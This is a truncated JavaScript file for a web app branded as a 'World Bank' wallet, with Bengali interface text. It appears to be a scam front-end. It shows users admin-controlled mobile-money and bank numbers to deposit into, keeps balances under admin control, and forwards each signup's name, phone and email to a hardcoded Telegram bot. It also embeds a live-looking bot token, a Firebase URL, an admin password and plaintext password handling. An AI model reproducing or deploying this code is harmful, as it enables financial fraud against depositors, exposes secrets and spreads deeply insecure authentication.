const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";
const ADMIN_SECURITY_PASS = "worldbank1234@#";

let adminDepositNumbers = JSON.parse(localStorage.getItem('wb_deposit_numbers')) || {
    "ЁЯФ┤ bKash Account": "01800000000 (bKash Agent)",
    "ЁЯЯа Nagad Wallet": "01700000000 (Nagad Personal)",
    "ЁЯЯг Rocket DBBL": "01900000000-1 (Rocket Personal)",
    "ЁЯЯв Upay Mobile": "01600000000 (Upay Personal)",
    "ЁЯПЫя╕П Dutch Bangla Bank (DBBL)": "A/C: 123.456.7890 (World Bank DBBL)",
    "ЁЯФ┤ POSB Bank (Singapore)": "POSB 123-45678-9",
    "ЁЯФ╡ DBS Bank (Singapore)": "DBS 987-65432-1",
    "ЁЯФ┤ UOB Bank (Singapore)": "UOB 456-78901-2",
    "ЁЯЯв PayNow (Singapore)": "+65 80000000 (PayNow)"
};

const exchangeRatesUSD = { "USD": 1.0, "BDT": 117.50, "MYR": 4.70, "SAR": 3.75, "AED": 3.67, "SGD": 1.35 };
const countryCurrencyMap = { "+880": "рз│", "+65": "$", "+60": "MYR", "+966": "SAR", "+971": "AED", "+1": "$", "+44": "┬г", "+91": "тВ╣", "+968": "OMR", "+974": "QAR", "+965": "KWD" };

// рзз. ржмрж╛ржВрж▓рж╛ржжрзЗрж╢рзЗрж░ рж╕ржорж╕рзНржд ржмрзНржпрж╛ржВржХ ржПржмржВ ржорзЛржмрж╛ржЗрж▓ ржмрзНржпрж╛ржВржХрж┐ржВ ржУрзЯрж╛рж▓рзЗржЯрж╕ржорзВрж╣ (рж╕ржм рж╕ржорзЯ ржмрж╛ржзрзНржпрждрж╛ржорзВрж▓ржХ ржпрзБржХрзНржд ржерж╛ржХржмрзЗ)
const mandatoryBangladeshBanks = [
    "ЁЯФ┤ bKash Account (BD)", 
    "ЁЯЯа Nagad Wallet (BD)", 
    "ЁЯЯг Rocket DBBL (BD)", 
    "ЁЯЯв Upay Mobile (BD)",
    "ЁЯПЫя╕П Dutch Bangla Bank (DBBL)", 
    "ЁЯПЫя╕П Islami Bank Bangladesh (IBBL)", 
    "ЁЯПЫя╕П BRAC Bank PLC", 
    "ЁЯПЫя╕П City Bank PLC",
    "ЁЯПЫя╕П Sonali Bank PLC",
    "ЁЯПЫя╕П Pubali Bank PLC",
    "ЁЯПЫя╕П IFIC Bank PLC",
    "ЁЯПЫя╕П IDLC Finance PLC",
    "ЁЯПЫя╕П Bangladesh Krishi Bank",
    "ЁЯМ╛ Grameen Bank",
    "ЁЯПЫя╕П Eastern Bank PLC (EBL)"
];

// рзи. ржмрж┐ржнрж┐ржирзНржи ржЖржирзНрждрж░рзНржЬрж╛рждрж┐ржХ ржжрзЗрж╢рзЗрж░ ржЬржиржкрзНрж░рж┐рзЯ ржмрзНржпрж╛ржВржХрж╕ржорзВрж╣
const mandatorySingaporeBanks = ["ЁЯФ┤ POSB Bank (Singapore)", "ЁЯФ╡ DBS Bank (Singapore)", "ЁЯФ┤ UOB Bank (Singapore)", "ЁЯФ┤ OCBC Bank (Singapore)", "ЁЯЯв PayNow Transfer", "ЁЯТО Trust Bank (Singapore)"];
const mandatoryMalaysiaBanks = ["ЁЯПЫя╕П Maybank (Malaysia)", "ЁЯПЫя╕П CIMB Bank", "ЁЯПЫя╕П Public Bank", "ЁЯПЫя╕П RHB Bank", "ЁЯУ▓ Touch 'n Go eWallet", "ЁЯЯв DuitNow Transfer"];
const mandatorySaudiBanks = ["ЁЯПЫя╕П Al Rajhi Bank", "ЁЯПЫя╕П SNB AlAhli Bank", "ЁЯПЫя╕П Riyad Bank", "ЁЯУ▓ STC Pay Wallet", "ЁЯЯв Urpay Wallet"];
const mandatoryUAEBanks = ["ЁЯПЫя╕П Emirates NBD", "ЁЯПЫя╕П Abu Dhabi Commercial Bank (ADCB)", "ЁЯПЫя╕П First Abu Dhabi Bank (FAB)", "ЁЯПЫя╕П Dubai Islamic Bank", "ЁЯУ▓ PayBy Wallet"];
const mandatoryUSABanks = ["ЁЯПЫя╕П Bank of America", "ЁЯПЫя╕П Chase Bank", "ЁЯПЫя╕П Wells Fargo", "ЁЯПЫя╕П Citibank", "ЁЯУ▓ Zelle / Venmo Transfer"];
const mandatoryUKBanks = ["ЁЯПЫя╕П Barclays Bank", "ЁЯПЫя╕П HSBC UK", "ЁЯПЫя╕П Lloyds Bank", "ЁЯПЫя╕П NatWest", "ЁЯУ▓ Revolut / Monzo"];
const mandatoryIndiaBanks = ["ЁЯПЫя╕П State Bank of India (SBI)", "ЁЯПЫя╕П HDFC Bank", "ЁЯПЫя╕П ICICI Bank", "ЁЯУ▓ PhonePe / GooglePay (UPI)"];

const countrySpecificBanksWithLogos = { 
    "+880": [],
    "+65": mandatorySingaporeBanks,
    "+60": mandatoryMalaysiaBanks,
    "+966": mandatorySaudiBanks,
    "+971": mandatoryUAEBanks,
    "+1": mandatoryUSABanks,
    "+44": mandatoryUKBanks,
    "+91": mandatoryIndiaBanks
};

const defaultBalances = { WorldBank: 0.00, bKash: 0.00, Nagad: 0.00, Rocket: 0.00 };

let usersDatabase = [];
let bannedEmails = [];
let allTransactions = [];
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'bn';
let tempProfilePhotoBase64 = null;
let cameraStream = null;
let isDarkMode = false;

// ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо ржмржЯ ржирзЛржЯрж┐ржлрж┐ржХрзЗрж╢ржи рж╕ржЪрж▓рзАржХрж░ржг
function sendTelegramNotification(message) {
    if (!BOT_TOKEN || !CHAT_ID) return;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

function updateUIHeaderDetails() {
    if (!activeUser) return;
    const nameEl = document.getElementById('userNameDisp');
    const phoneEl = document.getElementById('userPhoneDisp');
    if (nameEl) nameEl.innerText = activeUser.name || 'User Name';
    if (phoneEl) phoneEl.innerText = activeUser.phone || '';
}

function showAdminDepositNumber(selectEl) {
    const numBox = document.getElementById('adminNumberBox');
    const numDisp = document.getElementById('dispAdminAccNum');
    const selectedVal = selectEl.value;
    if (!numBox || !numDisp) return;
    if (selectedVal && adminDepositNumbers[selectedVal]) {
        numDisp.innerText = adminDepositNumbers[selectedVal];
        numBox.classList.remove('hidden');
    } else if (selectedVal) {
        numDisp.innerText = "Official World Bank Account / Contact Admin";
        numBox.classList.remove('hidden');
    } else {
        numBox.classList.add('hidden');
    }
}

async function adminSaveDepositNumber(e) {
    e.preventDefault();
    const method = document.getElementById('admDepMethodSelect').value;
    const newNumber = document.getElementById('admDepNumberInput').value.trim();
    if (!method || !newNumber) return;

    adminDepositNumbers[method] = newNumber;
    localStorage.setItem('wb_deposit_numbers', JSON.stringify(adminDepositNumbers));

    try {
        await fetch(`${FIREBASE_DB_URL}/depositNumbers.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(adminDepositNumbers)
        });
        showCustomAlert("рж╕ржлрж▓", `${method} ржПрж░ ржЬржирзНржп ржиржорзНржмрж░ рж╕рзЗржн рж╣рзЯрзЗржЫрзЗ!`);
        e.target.reset();
    } catch(err) {
        showCustomAlert("ржПрж░рж░", "ржлрж╛рзЯрж╛рж░ржмрзЗрж╕рзЗ рж╕рзЗржн ржХрж░рж╛ ржпрж╛рзЯржирж┐!");
    }
}

async function syncDepositNumbersFromFirebase() {
    try {
        const res = await fetch(`${FIREBASE_DB_URL}/depositNumbers.json`);
        const data = await res.json();
        if (data) {
            adminDepositNumbers = data;
            localStorage.setItem('wb_deposit_numbers', JSON.stringify(adminDepositNumbers));
        }
    } catch(err) { console.error("Deposit numbers sync error:", err); }
}

function toggleTheme() {
    isDarkMode = !isDarkMode;
    const dash = document.getElementById('dashboardSection');
    if (dash) {
        dash.style.background = isDarkMode ? "#0f172a" : "#f8fafc";
        dash.style.color = isDarkMode ? "#f8fafc" : "#0f172a";
    }
}

function toggleCurrencyCalcModal() {
    const modal = document.getElementById('currencyCalcModal');
    if (modal) {
        modal.classList.toggle('hidden');
        calculateCurrencyExchange();
    }
}

function calculateCurrencyExchange() {
    const amtInput = document.getElementById('calcAmountInput');
    const fromSelect = document.getElementById('calcFromCurr');
    const toSelect = document.getElementById('calcToCurr');
    const resultDisp = document.getElementById('calcResultDisp');
    if (!amtInput || !fromSelect || !toSelect || !resultDisp) return;

    const amt = parseFloat(amtInput.value) || 0;
    const usdVal = amt / (exchangeRatesUSD[fromSelect.value] || 1);
    const converted = usdVal * (exchangeRatesUSD[toSelect.value] || 1);
    resultDisp.innerText = `${toSelect.value} ${converted.toFixed(2)}`;
}

function toggleNotificationsModal() {
    const modal = document.getElementById('notificationsModal');
    if (modal) {
        modal.classList.toggle('hidden');
        renderNotificationsList();
    }
}

function renderNotificationsList() {
    const listEl = document.getElementById('notificationsList');
    const badgeEl = document.getElementById('notifBadge');
    if (!listEl || !activeUser) return;

    listEl.innerHTML = '';
    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);

    if (badgeEl) {
        if (myTxs.length > 0) {
            badgeEl.innerText = myTxs.length;
            badgeEl.classList.remove('hidden');
        } else {
            badgeEl.classList.add('hidden');
        }
    }

    if (myTxs.length === 0) {
        listEl.innerHTML = `<div style="text-align:center; color:#64748b; font-size:12px; padding:10px;">ржХрзЛржирзЛ ржирзЛржЯрж┐ржлрж┐ржХрзЗрж╢ржи ржирзЗржЗред</div>`;
        return;
    }

    myTxs.forEach(t => {
        const item = document.createElement('div');
        let bgCol = '#fef3c7', borderCol = '#f59e0b', textCol = '#d97706', titleText = 'тП│ ржкрзЗржирзНржбрж┐ржВ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ';
        
        if (t.type === 'AdminCredit') {
            bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
            titleText = 'ЁЯПЫя╕П ржУржпрж╝рж╛рж░рзНрж▓рзНржб ржмрзНржпрж╛ржВржХ ржерзЗржХрзЗ ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржпрзЛржЧ рж╣рзЯрзЗржЫрзЗ!';
        } else if (t.type === 'AdminDebit') {
            bgCol = '#fee2e2'; borderCol = '#ef4444'; textCol = '#b91c1c';
            titleText = 'ЁЯПЫя╕П ржУржпрж╝рж╛рж░рзНрж▓рзНржб ржмрзНржпрж╛ржВржХ ржерзЗржХрзЗ ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржХрж░рзНрждржи ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ';
        } else if (t.status === 'Approved') {
            bgCol = '#d1fae5'; borderCol = '#10b981'; textCol = '#047857';
            titleText = 'тЬЕ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржЕржирзБржорзЛржжрж┐ржд!';
        } else if (t.status === 'Rejected') {
            bgCol = '#fee2e2'; borderCol = '#ef4444'; textCol = '#b91c1c';
            titleText = 'тЭМ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржмрж╛рждрж┐рж▓ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ';
        }

        item.style.cssText = `padding:8px 12px; border-radius:6px; background:${bgCol}; border:1px solid ${borderCol}; font-size:11px; margin-bottom:6px;`;
        
        let descText = "";
        if (t.type === 'AdminCredit') {
            descText = `ржЖржкржирж╛рж░ ржорзЗржЗржи ржмрзНржпрж╛рж▓рзЗржирзНрж╕рзЗ ${t.currency || 'рз│'}${formatAmountLocale(t.amount)} ржЬржорж╛ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗред ржЕржмрж╢рж┐рж╖рзНржЯ ржмрзНржпрж╛рж▓рзЗржирзНрж╕: ${t.currency || 'рз│'}${formatAmountLocale(t.remBal)}`;
        } else if (t.type === 'AdminDebit') {
            descText = `ржЖржкржирж╛рж░ ржорзЗржЗржи ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржерзЗржХрзЗ ${t.currency || 'рз│'}${formatAmountLocale(t.amount)} ржХрж░рзНрждржи ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗред ржЕржмрж╢рж┐рж╖рзНржЯ ржмрзНржпрж╛рж▓рзЗржирзНрж╕: ${t.currency || 'рз│'}${formatAmountLocale(t.remBal)}`;
        } else {
            descText = `ржЖржкржирж╛рж░ ${t.type} (${t.currency || 'рз│'}${formatAmountLocale(t.amount)}) рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯред ржиржорзНржмрж░: ${t.phone}`;
        }

        item.innerHTML = `
            <strong style="color:${textCol}">${titleText}</strong>
            <p style="margin-top:2px; color:#334155;">${descText}</p>
            <span style="font-size:9px; color:#64748b;">${t.dateStr} ${t.timeStr}</span>
        `;
        listEl.appendChild(item);
    });
}

function downloadTransactionReceipt(txId) {
    const tx = allTransactions.find(t => t.id === txId);
    if (!tx) return;

    const receiptContent = `
========================================
           WORLD BANK RECEIPT           
========================================
Transaction ID : ${tx.trxId}
Date & Time    : ${tx.dateStr} ${tx.timeStr}
Type           : ${tx.type}
Method         : ${tx.method}
Account/Phone  : ${tx.phone}
Amount         : ${tx.currency || 'рз│'} ${formatAmountLocale(tx.amount)}
Remaining Bal  : ${tx.remBal !== undefined ? (tx.currency || 'рз│') + ' ' + formatAmountLocale(tx.remBal) : 'N/A'}
Status         : ${tx.status}
========================================
      Thank you for banking with us!    
========================================
    `;

    const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Receipt_${tx.trxId}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// ржЗржЙржЬрж╛рж░рзЗрж░ ржорзЛржмрж╛ржЗрж▓ ржиржорзНржмрж░рзЗрж░ ржХрж╛ржирзНржЯрзНрж░рж┐ ржХрзЛржб ржЕржирзБржпрж╛рзЯрзА ржирж┐рж░рзНржжрж┐рж╖рзНржЯ ржжрзЗрж╢рзЗрж░ ржмрзНржпрж╛ржВржХ + ржмрж╛ржзрзНржпрждрж╛ржорзВрж▓ржХ ржмрж╛ржВрж▓рж╛ржжрзЗрж╢ ржмрзНржпрж╛ржВржХ ржкрзНрж░ржжрж░рзНрж╢ржи
function populateUserDynamicBanksWithLogos() {
    const addSelect = document.getElementById('addMoneyMethodSelect');
    const transferSelect = document.getElementById('fundTransferMethodSelect');
    if (!addSelect || !transferSelect) return;

    let countryCode = "+880";
    if (activeUser && activeUser.phone) {
        const p = activeUser.phone.trim();
        for (let code in countrySpecificBanksWithLogos) {
            if (p.startsWith(code)) {
                countryCode = code;
                break;
            }
        }
    }

    const currentCountryBanks = countrySpecificBanksWithLogos[countryCode] || [];
    // ржЙржХрзНржд ржжрзЗрж╢рзЗрж░ ржмрзНржпрж╛ржВржХ + ржмрж╛ржзрзНржпрждрж╛ржорзВрж▓ржХ ржмрж╛ржВрж▓рж╛ржжрзЗрж╢рзЗрж░ рж╕ржм ржмрзНржпрж╛ржВржХ ржПржХрждрзНрж░рзЗ ржорж╛рж░рзНржЬ
    let combinedBanks = Array.from(new Set([
        "ЁЯПЫя╕П World Bank Main Account", 
        ...currentCountryBanks, 
        ...mandatoryBangladeshBanks, 
        "ЁЯМР International Wire Transfer"
    ]));

    addSelect.innerHTML = `<option value="">ржкрзЗржорзЗржирзНржЯ ржорзЗржержб ржмрж╛ ржмрзНржпрж╛ржВржХ рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи</option>`;
    transferSelect.innerHTML = `<option value="">ржЯрзНрж░рж╛ржирзНрж╕ржлрж╛рж░ ржорж╛ржзрзНржпржо рж╕рж┐рж▓рзЗржХрзНржЯ ржХрж░рзБржи</option>`;

    combinedBanks.forEach(b => {
        addSelect.innerHTML += `<option value="${b}">${b}</option>`;
        transferSelect.innerHTML += `<option value="${b}">${b}</option>`;
    });
}

function checkLoginInputType(inputEl) {
    const val = inputEl.value.trim();
    const noteEl = document.getElementById('emailWarningNote');
    if (!noteEl) return;
    if (val.includes('@')) noteEl.classList.remove('hidden');
    else noteEl.classList.add('hidden');
}

async function openQuickPayScanner() {
    document.getElementById('cameraModal').classList.remove('hidden');
    try {
        const video = document.getElementById('qrVideoFeed');
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        video.srcObject = cameraStream;
    } catch (err) {
        showCustomAlert("ржХрзНржпрж╛ржорзЗрж░рж╛ ржПрж░рж░", "ржХрзНржпрж╛ржорзЗрж░рж╛ ржкрж╛рж░ржорж┐рж╢ржи ржкрж╛ржУрзЯрж╛ ржпрж╛рзЯржирж┐ред");
    }
}

function closeQuickPayScanner() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
    document.getElementById('cameraModal').classList.add('hidden');
}

function openUSAHotlineFAQ() {
    showCustomAlert("USA Hotline & FAQ", "World Bank Global Support:\nЁЯУЮ +1 (800) 555-0199\nтЬЙя╕П support@worldbank.org");
}

function filterCountryList() {
    const input = document.getElementById('countrySearchInput').value.toLowerCase();
    const select = document.getElementById('regCountryCode');
    for (let i = 0; i < select.options.length; i++) {
        select.options[i].style.display = select.options[i].text.toLowerCase().includes(input) ? "" : "none";
    }
}

function getUserCurrency(user) {
    if (!user) return 'рз│';
    if (user.currency) return user.currency;
    if (user.phone) {
        for (let code in countryCurrencyMap) {
            if (user.phone.trim().startsWith(code)) return countryCurrencyMap[code];
        }
    }
    return 'рз│';
}

function formatAmountLocale(amount) {
    return parseFloat(amount || 0).toFixed(2);
}

function showCustomAlert(title, message) {
    document.getElementById('customAlertTitle').innerText = title;
    document.getElementById('customAlertText').innerText = message;
    document.getElementById('customAlertModal').classList.remove('hidden');
}

function closeCustomAlert() {
    document.getElementById('customAlertModal').classList.add('hidden');
}

function sanitizeEmailKey(keyStr) {
    return keyStr ? keyStr.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

async function syncFromFirebase() {
    try {
        await syncDepositNumbersFromFirebase();
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
            if (activeUser) {
                const refreshedUser = usersDatabase.find(u => u.phone === activeUser.phone);
                if (refreshedUser) {
                    activeUser = { ...activeUser, ...refreshedUser };
                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                    updateUIHeaderDetails();
                    populateUserDynamicBanksWithLogos();
                }
            }
        }

        const bRes = await fetch(`${FIREBASE_DB_URL}/bannedEmails.json`);
        const bData = await bRes.json();
        if (bData) {
            bannedEmails = Object.values(bData);
            localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
        }

        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
            renderNotificationsList();
        }
    } catch(err) { console.error("Firebase sync error:", err); }
}

document.addEventListener('DOMContentLoaded', async () => {
    if (activeUser) {
        document.getElementById('authSection')?.classList.add('hidden');
        document.getElementById('dashboardSection')?.classList.remove('hidden');
        
        updateUIHeaderDetails();
        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanksWithLogos();
        renderNotificationsList();
    } else {
        let savedPhone = localStorage.getItem('wb_saved_phone');
        if (savedPhone) {
            let logPhoneInput = document.getElementById('logPhone');
            if (logPhoneInput) logPhoneInput.value = savedPhone;
        }
    }
    await syncFromFirebase();
});

function openAddMoneyModal() { 
    const modal = document.getElementById('addMoneyModal');
    if (modal) {
        modal.classList.toggle('hidden');
        document.getElementById('adminNumberBox')?.classList.add('hidden');
        document.getElementById('addMoneyForm')?.reset();
        populateUserDynamicBanksWithLogos();
    }
}

function openFundTransferModal() { 
    const modal = document.getElementById('fundTransferModal');
    if (modal) {
        modal.classList.toggle('hidden');
        populateUserDynamicBanksWithLogos();
    }
}

function openTopUpModal() { 
    showCustomAlert("Mobile Top Up", "ржорзЛржмрж╛ржЗрж▓ ржЯржк ржЖржк ржЕржкрж╢ржиржЯрж┐ ржПржЦржирзЛ ржЪрж╛рж▓рзБ рж╣ржпрж╝ржирж┐!");
}
function openCardBankModal() { document.getElementById('cardBankModal')?.classList.toggle('hidden'); }
function toggleForgotModal() { document.getElementById('forgotModal')?.classList.toggle('hidden'); }

function updateAvatarDisplay() {
    const avatarEl = document.getElementById('userAvatarDisp');
    if (!avatarEl) return;
    if (activeUser && activeUser.photo) {
        avatarEl.style.backgroundImage = `url(${activeUser.photo})`;
        avatarEl.innerText = '';
    } else {
        avatarEl.style.backgroundImage = 'none';
        avatarEl.innerText = 'ЁЯСд';
    }
}

async function saveUserToFirebase(user) {
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${sanitizeEmailKey(user.phone)}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(user)
        });
    } catch(err) { console.error("User save error:", err); }
}

async function saveTxToFirebase(txObj) {
    try {
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(txObj)
        });
    } catch(err) { console.error("Tx save error:", err); }
}

function togglePasswordVisibility(inputId, btn) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        btn.innerText = 'ЁЯЩИ';
    } else {
        input.type = 'password';
        btn.innerText = 'ЁЯСБя╕П';
    }
}

function handleForgotPassword(e) {
    e.preventDefault();
    const email = document.getElementById('forgotEmailInput').value.trim();
    const phone = document.getElementById('forgotPhoneInput').value.trim();
    const user = usersDatabase.find(u => u.email === email && u.phone.includes(phone));
    if (user) {
        showCustomAlert("рж░рж┐ржХржнрж╛рж░рж┐ рж╕ржлрж▓", `ржЖржкржирж╛рж░ ржкрж╛рж╕ржУрзЯрж╛рж░рзНржб: ${user.password}`);
        toggleForgotModal();
    } else {
        showCustomAlert("рждрзНрж░рзБржЯрж┐", 'ржкрзНрж░ржжрждрзНржд ржЗржорзЗржЗрж▓ ржмрж╛ ржорзЛржмрж╛ржЗрж▓ ржиржорзНржмрж░ржЯрж┐ ржкрж╛ржУрзЯрж╛ ржпрж╛рзЯржирж┐!');
    }
}

function handleCountryChange(selectEl) {
    setLanguage(selectEl.options[selectEl.selectedIndex].getAttribute('data-lang') || 'bn');
}

function toggleLangLoop() {
    const langOrder = ['bn', 'en', 'es'];
    let nextIdx = (langOrder.indexOf(currentLang) + 1) % langOrder.length;
    setLanguage(langOrder[nextIdx]);
}

function setLanguage(lang) {
    currentLang = lang;
    const dashBtn = document.getElementById('dashLangBtn');
    if (dashBtn) dashBtn.innerText = lang.toUpperCase();

    document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
    if (lang === 'bn') document.getElementById('btnLangBN')?.classList.add('active');
    if (lang === 'en') document.getElementById('btnLangEN')?.classList.add('active');
    if (lang === 'es') document.getElementById('btnLangES')?.classList.add('active');

    document.querySelectorAll('[data-' + lang + ']').forEach(el => {
        el.innerText = el.getAttribute('data-' + lang);
    });

    document.querySelectorAll('[data-ph-' + lang + ']').forEach(el => {
        el.placeholder = el.getAttribute('data-ph-' + lang);
    });
}

function switchTab(type) {
    const loginForm = document.getElementById('loginForm');
    const signUpForm = document.getElementById('signUpForm');
    document.getElementById('errorText').style.display = 'none';

    if(type === 'login') {
        loginForm?.classList.remove('hidden');
        signUpForm?.classList.add('hidden');
        document.getElementById('loginTab')?.classList.add('active');
        document.getElementById('signUpTab')?.classList.remove('active');
    } else {
        signUpForm?.classList.remove('hidden');
        loginForm?.classList.add('hidden');
        document.getElementById('signUpTab')?.classList.add('active');
        document.getElementById('loginTab')?.classList.remove('active');
    }
}

async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const countryCodeSelect = document.getElementById('regCountryCode');
    const rawPhone = document.getElementById('regPhone').value.trim();
    const password = document.getElementById('regPass').value;
    const fullPhone = countryCodeSelect.value + rawPhone;
    const currency = countryCodeSelect.options[countryCodeSelect.selectedIndex].getAttribute('data-currency') || 'рз│';

    if (usersDatabase.some(u => u.phone === fullPhone || u.email === email)) {
        showCustomAlert("рж╕рждрж░рзНржХрждрж╛", 'ржПржЗ ржлрзЛржи ржиржорзНржмрж░ ржмрж╛ ржЗржорзЗржЗрж▓ ржжрж┐рзЯрзЗ ржЖржЧрзЗржЗ ржЕрзНржпрж╛ржХрж╛ржЙржирзНржЯ ржЦрзЛрж▓рж╛ рж╣рзЯрзЗржЫрзЗ!');
        return;
    }

    const newUser = {
        name: name, 
        email: email, 
        phone: fullPhone, 
        currency: currency, 
        password: password,
        photo: null, 
        totalBalance: 0.00, 
        withdrawLimit: 0.00,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    localStorage.setItem('wb_saved_phone', fullPhone);
    saveUserToFirebase(newUser);

    sendTelegramNotification(`ЁЯЖХ <b>ржирждрзБржи ржЗржЙржЬрж╛рж░ рж╕рж╛ржЗржи ржЖржк!</b>\nЁЯСд ржирж╛ржо: ${name}\nЁЯУ▒ ржлрзЛржи: ${fullPhone}\nЁЯУз ржЗржорзЗржЗрж▓: ${email}`);

    showCustomAlert("рж╕ржлрж▓", 'ржЕрзНржпрж╛ржХрж╛ржЙржирзНржЯ рждрзИрж░рж┐ рж╣рзЯрзЗржЫрзЗ! ржЖржкржирж╛рж░ ржмрзНржпрж╛рж▓рзЗржирзНрж╕ ржУ ржЙржЗржержбрзНрж░ рж▓рж┐ржорж┐ржЯ рз│рзж.рзжрзжред ржПржЦржи ржорзЛржмрж╛ржЗрж▓ ржиржорзНржмрж░ ржжрж┐рзЯрзЗ рж▓ржЧржЗржи ржХрж░рзБржиред');
    switchTab('login');
    document.getElementById('logPhone').value = fullPhone;
    document.getElementById('signUpForm').reset();
}

async function handleLogin(e) {
    e.preventDefault();
    const inputPhone = document.getElementById('logPhone').value.trim();
    const password = document.getElementById('logPass').value;

    const user = usersDatabase.find(u => u.phone.includes(inputPhone) && u.password === password);
    if(user) {
        activeUser = user;
        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };
        if(activeUser.totalBalance === undefined) activeUser.totalBalance = 0.00;
        if(activeUser.withdrawLimit === undefined) activeUser.withdrawLimit = 0.00;

        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        localStorage.setItem('wb_saved_phone', activeUser.phone);

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        
        updateUIHeaderDetails();
        updateAvatarDisplay();
        renderBalances();
        populateUserDynamicBanksWithLogos();
        renderNotificationsList();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

function renderBalances() {
    const pillText = document.getElementById('balancePillText');
    const symbolEl = document.getElementById('dashCurrencySymbol');
    const userCurr = getUserCurrency(activeUser);
    if (symbolEl && activeUser) symbolEl.innerText = userCurr;
    if (pillText) pillText.innerText = "Balance";
}

function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;
    if (balanceHideTimer) clearTimeout(balanceHideTimer);

    const rawBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : 0.00;
    pillText.innerText = `${getUserCurrency(activeUser)} ${formatAmountLocale(rawBal)}`;
    balanceHideTimer = setTimeout(() => { pillText.innerText = "Balance"; }, 3000);
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    document.getElementById('dashboardSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('loginForm')?.reset();
}

function previewProfilePhoto(e) {
    const file = e.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(event) {
            tempProfilePhotoBase64 = event.target.result;
            const prev = document.getElementById('profileImagePreview');
            if (prev) {
                prev.style.backgroundImage = `url(${tempProfilePhotoBase64})`;
                prev.innerText = '';
            }
        };
        reader.readAsDataURL(file);
    }
}

function toggleProfileModal() {
    document.getElementById('profileModal').classList.toggle('hidden');
    if (activeUser) {
        document.getElementById('profNameInput').value = activeUser.name || '';
        document.getElementById('profPhoneInput').value = activeUser.phone || '';
        document.getElementById('profPassInput').value = activeUser.password || '';
    }
}

async function openInboxModal() {
    document.getElementById('inboxModal').classList.toggle('hidden');
    renderUserInboxHistory();
}

function renderUserInboxHistory() {
    const tbody = document.getElementById('userInboxModalBody');
    const filterSelect = document.getElementById('statementFilterSelect');
    if (!tbody || !activeUser) return;
    
    tbody.innerHTML = '';
    const filterType = filterSelect ? filterSelect.value : 'ALL';
    let myTxs = allTransactions.filter(t => t.userEmail === activeUser.phone);
    if (filterType !== 'ALL') myTxs = myTxs.filter(t => t.type.includes(filterType) || (filterType === 'AdminCredit' && t.type.includes('Admin')));

    if (myTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">ржХрзЛржирзЛ рж░рзЗржХрж░рзНржб ржкрж╛ржУрзЯрж╛ ржпрж╛рзЯржирж┐ред</td></tr>`;
        return;
    }

    myTxs.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending тП│</span>`;
